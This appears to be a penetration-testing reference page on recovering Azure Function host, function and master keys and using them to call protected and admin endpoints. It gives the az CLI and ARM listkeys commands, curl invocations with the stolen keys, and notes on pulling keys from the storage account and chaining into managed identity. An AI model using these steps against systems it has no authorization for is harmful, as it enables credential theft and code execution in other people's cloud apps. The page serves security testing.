---
title: "Function keys: recovering host and function keys to invoke protected endpoints"
description: "Recovering Azure Function host and function keys to invoke protected functions and admin endpoints."
keywords:
  - function keys
  - host key
  - master key
  - admin endpoint
  - invoke
---

# Function keys

Functions with `function` or `admin` authorization level are gated by **keys**: per-function keys, host keys shared across the app, and the `_master` key that reaches the admin API. With `Microsoft.Web/sites/host/listkeys` (or Contributor on the app), those keys are readable, and the master key unlocks the admin endpoints that invoke any function and read runtime state.

## Listing keys

```bash
az functionapp keys list -g <rg> -n <app>            # host and master keys
az functionapp function keys list -g <rg> -n <app> --function-name <fn>
# raw ARM if the CLI verb is unavailable
az rest --method post --uri \
  "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Web/sites/<app>/host/default/listkeys?api-version=2022-03-01"
```

## Invoking with a recovered key

```bash
curl "https://<app>.azurewebsites.net/api/<fn>?code=<function-key>"
# admin endpoints with the master key
curl -H "x-functions-key: <master-key>" \
  "https://<app>.azurewebsites.net/admin/functions"
```

## Exploitation notes

- The `_master` key is effectively app-admin for the Functions runtime; treat its recovery as code execution on the app.
- Keys are also written into the app's storage account (`azure-webjobs-secrets` container), so storage-account access yields them without an ARM call.
- Invoking a function that itself holds a managed identity chains into [managed identity](managed-identity.md).

## Tools

- **Azure CLI** (`functionapp keys list`, `az rest`).
- **MicroBurst**: enumerates Function apps and pulls their secrets.

## References

- [Microsoft: work with access keys in Azure Functions](https://learn.microsoft.com/azure/azure-functions/function-keys-how-to)
- [HackTricks Cloud: Azure App Service and Functions](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
